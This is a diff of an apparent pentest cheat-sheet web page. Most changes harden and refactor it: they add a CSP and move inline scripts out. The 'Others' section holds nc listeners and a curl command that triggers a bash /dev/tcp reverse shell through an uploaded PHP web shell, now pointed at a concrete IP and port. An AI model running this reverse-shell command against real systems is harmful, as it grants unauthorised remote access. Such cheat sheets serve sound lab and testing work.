@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'">
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
 <link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
@@ -22,7 +23,7 @@
     <table>
       <tr><th>Tool</th><th>Description</th></tr>
 
-      <tr class="tool-row" onclick="toggleCmd('cmd-autres')">
+      <tr class="tool-row" data-toggle="cmd-autres">
         <td>Others</td><td>Other commands</td>
       </tr>
       <tr id="cmd-autres" class="command-row">
@@ -59,7 +60,7 @@
           <div>
             nc -lvnp 443</br>
             rlwrap nc -lvnp 443</br>
-            curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261'"
+            curl "http://MACHINE_IP/uploads/documents/shell.phtml?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.64.85.171/4444+0>%261'"
           </div>
 
           <div class="comment-line">---- Reverse Shell one-liner (bash) -----</div>
@@ -89,7 +90,7 @@
       </tr>
 
 
-    <tr class="tool-row" onclick="toggleCmd('cmd-filesearch')">
+    <tr class="tool-row" data-toggle="cmd-filesearch">
       <td>File search</td><td>Finding files commands</td>
     </tr>
 
@@ -150,7 +151,7 @@
 
 
 
-    <tr class="tool-row" onclick="toggleCmd('cmd-gitdump')">
+    <tr class="tool-row" data-toggle="cmd-gitdump">
   <td>Git dump</td><td>Exploiter une fuite .git</td>
   </tr>
 
@@ -191,7 +192,7 @@
 
 
 
-     <tr class="tool-row" onclick="toggleCmd('cmd-quit')">
+     <tr class="tool-row" data-toggle="cmd-quit">
   <td>Quit</td><td>What to do before quitting remote acces</td>
   </tr>
 
@@ -206,7 +207,7 @@
   </tr>
 
 
-     <tr class="tool-row" onclick="toggleCmd('cmd-init')">
+     <tr class="tool-row" data-toggle="cmd-init">
   <td>Init</td><td>Commandes de démarrage / initialisation</td>
   </tr>
 
@@ -217,7 +218,7 @@
       <div>[Démarrer ttyd] — scripts/ttyd-shells.sh start</div>
 
       <div class="comment-line">---- Monter le partage réseau -----</div>
-      <div>[Mount CIFS] — sudo mount -t cifs //&lt;serveur&gt;/&lt;partage&gt; /mnt/&lt;partage&gt; -o username=&lt;user&gt;,uid=$(id -u),gid=$(id -g),file_mode=0777,dir_mode=0777</div>
+      <div>[Mount CIFS PartageLocal] — sudo mount -t cifs //192.168.4.120/PartageLocal /mnt/PartageLocal -o username=GothamBlood,uid=$(id -u),gid=$(id -g),file_mode=0777,dir_mode=0777</div>
 
     </td>
   </tr>
@@ -226,36 +227,7 @@
   </div>
 </div>
 
-<script>
-  const embedded = window.self !== window.top;
-
-  // Tell the hub's modal our real content height. Called synchronously on
-  // the one interaction that changes it (toggling a command row) so there's
-  // no dependency on observer/timer scheduling; ResizeObserver below is
-  // just a fallback for anything else (initial layout, font swaps, etc).
-  function reportHeight() {
-    if (embedded) {
-      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
-    }
-  }
-
-  function toggleCmd(id) {
-    const row = document.getElementById(id);
-    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
-    reportHeight();
-  }
-
-  (function() {
-    const savedTheme = localStorage.getItem("/settings.html") || "standard";
-    document.body.classList.add("theme-" + savedTheme);
-    if (embedded) document.body.classList.add("embedded");
-  })();
-
-  if (embedded) {
-    new ResizeObserver(reportHeight).observe(document.body);
-    window.addEventListener("load", reportHeight);
-  }
-</script>
+<script src="../assets/script/tools-page-boot.js"></script>
 
 <script src="../config/tools/misc.js"></script>
 <script src="../assets/script/wallpaper-loader.js"></script>
@@ -263,9 +235,7 @@
 <script src="../assets/script/copy-commands.js"></script>
 <script src="../assets/script/page-effects.js"></script>
 <script src="../assets/script/page-effects-loader.js"></script>
-<script>
-  applyWallpaper(toolsMiscConfig.background, "tools-misc");
-</script>
+<script src="../assets/script/inline/tools-misc.js"></script>
 
 </body>
 </html>
